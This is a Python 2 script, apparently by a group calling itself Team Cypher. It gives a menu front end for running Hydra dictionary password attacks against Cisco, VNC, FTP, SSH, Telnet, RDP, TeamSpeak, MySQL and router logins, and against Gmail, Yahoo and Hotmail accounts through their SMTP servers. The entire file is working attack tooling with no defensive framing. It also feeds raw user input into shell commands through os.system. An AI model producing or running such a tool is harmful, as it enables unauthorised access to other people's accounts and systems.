#!/usr/bin/python
"""
This program is just a small program to shorten brute force sessions on hydra :)
But to be more satisfying results of the brute force. You better interact directly with hydra,
without having to use this black hydra console first: ').
If you find any errors in running our program. Can chat via facebook :).
Hydra is needed for the process of this program :).
"""
import sys, os, time

# Restart ####################
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################

os.system("clear")
print "/---- \ / |---- |   | |---- |----"
print "|      |  |   | |---| |---- |    \."
print "|      |  |---- |---| |---- |--- /"
print "\----  |  |     |   |       |    \."
print "    .........>>>>>  04/08/2018 "
print "         Author: Team Cypher, Version 1.0"
print "       Console Cypher inspired in Black-Hydra"
print "              Leader Zer0> Cypher Team"
print
print "                  + Brute Force- "
print
print "  #01# Cisco  "
print "  #02# VNC    "
print "  #03# FTP    "
print "  #04# Gmail  "
print "  #05# SSH    "
print "  #06# TeamSpeak  "
print "  #07# Telnet "
print "  #08# Yahoo Mail "
print "  #09# Hotmail"
print "  #10# RouterSpedy"
print "  #11# RDP    "
print "  #12# MySQL  "
print
print "  *00* Exit"
print
CypherBrute = raw_input("##### G-Cypher> ") 

if CypherBrute == '01' or CypherBrute == '1':
  print
  print "          +++++++++++++++++++++++++++++"
  print "          |            Cisco          |"
  print "          +++++++++++++++++++++++++++++"
  print
  iphost = raw_input("## IP/Hostname : ")
  word = raw_input("# Dictionary: ")
  os.system("hydra -P %s %s cisco" % (word, iphost))
  sys.exit()
  
elif CypherBrute == '02' or CypherBrute == '2':
  print
  print "          *===========================*"
  print "          |             VNC           |"
  print "          *===========================*"
  print
  print
  word = raw_input("## Dictionary : ")
  iphost = raw_input("#  IP/Hostname : ")
  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  iphost = raw_input("[*] IP/Hostname : ")
  
elif CypherBrute == '03' or CypherBrute == '3':
  print "          |           FTP             |"
  print"           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
  print
  user = raw_input("## User : ")
  iphost = raw_input("# IP/Hostname : ")
  word = raw_input("$$ Dictionary : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()
  
elif CypherBrute == '04' or CypherBrute == '4':
  
  print "          |            Gmail          |"
  print "          ============================="
  print
  email = raw_input("# Email : ")
  word = raw_input("# Dictionary : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()
  
elif CypherBrute == '05' or CypherBrute == '5':
   print
   print "         +--------------------------------+"
   print "         |               SSH              |"
   print "         +--------------------------------+"
   print
   print
   user = raw_input("## User : ")
   word = raw_input("# Dictionary : ")
   iphost = raw_input("$$ IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()
   
elif CypherBrute == '06' or CypherBrute == '6':
	print
	print "        +-------------------------+"
	print "        |        TeamSpeak        |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("## User : ")
	word = raw_input("# Dictionary : ")
	iphost = raw_input("$$ IP/Hostname : ")
	os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
	sys.exit()

elif CypherBrute == '07' or CypherBrute == '7':
	print
	print "        +-------------------------+"
	print "        |         Telnet          |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("## User : ")
	word = raw_input("# Dictionary : ")
	iphost = raw_input("$$ IP/Hostname : ")
	os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
	sys.exit()
	
elif CypherBrute == '08' or CypherBrute == '8':
  print
  print "          +---------------------------+"
  print "          |           Yahoo           |"
  print "          +---------------------------+"
  print
  print
  email = raw_input("## Email : ")
  word = raw_input("# Dictionary : ")
  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
  sys.exit()
  
elif CypherBrute == '09' or CypherBrute == '9':
  print
  print "          +----------------------------+"
  print "          |           Hotmail          |"
  print "          +----------------------------+"
  print
  print
  email = raw_input("## Email : ")
  word = raw_input("# Dictionary : ")
  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  sys.exit()
  
elif CypherBrute == '10':
	print
	print "        +-----------------------------+"
	print "        |        Router Speedy        |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("## User : ")
	word = raw_input("# Dictionary : ")
	iphost = raw_input("# IP/Hostname : ")
	os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
	sys.exit()
	
elif CypherBrute == '11':
	print
	print "        +----------------------------+"
	print "        |             RDP            |"
	print "        +----------------------------+"
	print
	print
	user = raw_input("# User : ")
	word = raw_input("# Dictionary : ")
	iphost = raw_input("# IP/Hostname : ")
	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
	sys.exit()
	
elif CypherBrute == '12':
	print
	print "        +-----------------------------+"
	print "        |             MySQL           |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Dictionary : ")
	os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
	
elif CypherBrute == '00' or CypherBrute == '0':
	print "\n# Good Bye ;("
	sys.exit()
	
else:
	print "\n#### ERROR : Incorrect Input"
	time.sleep(5)
	restart_program()
